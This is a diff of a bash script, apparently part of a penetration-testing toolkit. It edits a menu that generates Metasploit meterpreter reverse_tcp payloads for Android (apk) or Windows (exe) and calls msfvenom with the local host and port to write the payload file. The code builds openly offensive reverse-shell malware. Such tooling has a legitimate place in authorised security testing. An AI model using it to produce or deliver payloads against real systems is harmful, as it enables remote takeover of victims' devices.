@@ -3488,22 +3488,30 @@ fi
 f_payload(){
 clear
 f_banner
-echo -e "\x1B[1;34mPayloads: ***WORK IN PROGRESS*** \x1B[0m"
+echo -e "\x1B[1;34mPayloads:\x1B[0m"
 echo "1.  android/meterpreter/reverse_tcp"
 echo "2.  windows/meterpreter/reverse_tcp"
 echo
 echo -n "Choice: "
-read payload
+read choice
 
 # Check for choice.
-if [[ $payload -lt 1 || $payload -gt 2 ]]; then
+if [[ $choice -lt 1 || $choice -gt 2 ]]; then
 	f_error
 fi
 
-if [ "$payload" == "1" ]; then
+if [ "$choice" == "1" ]; then
 	payload="android/meterpreter/reverse_tcp"
+	format="raw"
+     arch="dalvik"
+	platform="android"
+	extention="apk"
 else
 	payload="windows/meterpreter/reverse_tcp"
+	format="exe"
+     arch="x86"
+	platform="windows"
+	extention="exe"
 fi
 
 echo -n "Local port: "
@@ -3515,40 +3523,7 @@ if [[ $port -lt 1 || $port -gt 65535 ]]; then
 fi
 
 echo
-echo -e "\x1B[1;34mArchs:\x1B[0m"
-echo "1.  x86"
-echo "2.  x64"
-echo
-echo -n "Choice: "
-read arch
-
-# Check for choice.
-if [[ $arch -lt 1 || $arch -gt 2 ]]; then
-	f_error
-fi
-
-if [ "$arch" == "1" ]; then
-	arch="x86"
-else
-	arch="x64"
-fi
-
-if [ "$payload" == "android/meterpreter/reverse_tcp" ]; then
-	extention="apk"
-	format="raw"
-	platform="android"
-else
-	extention="exe"
-	format="exe"
-	platform="windows"
-fi
-	
 $msfv -p $payload LHOST=$ip LPORT=$port -f $format -a $arch --platform $platform -o $home/data/payload-$platform-$arch.$extention
-
-echo
-echo $medium
-echo
-printf 'The malicious payload is located at \x1B[1;33m%s\x1B[0m\n' $home/data/payload-$platform-$arch.$extention
 echo
 echo
 exit
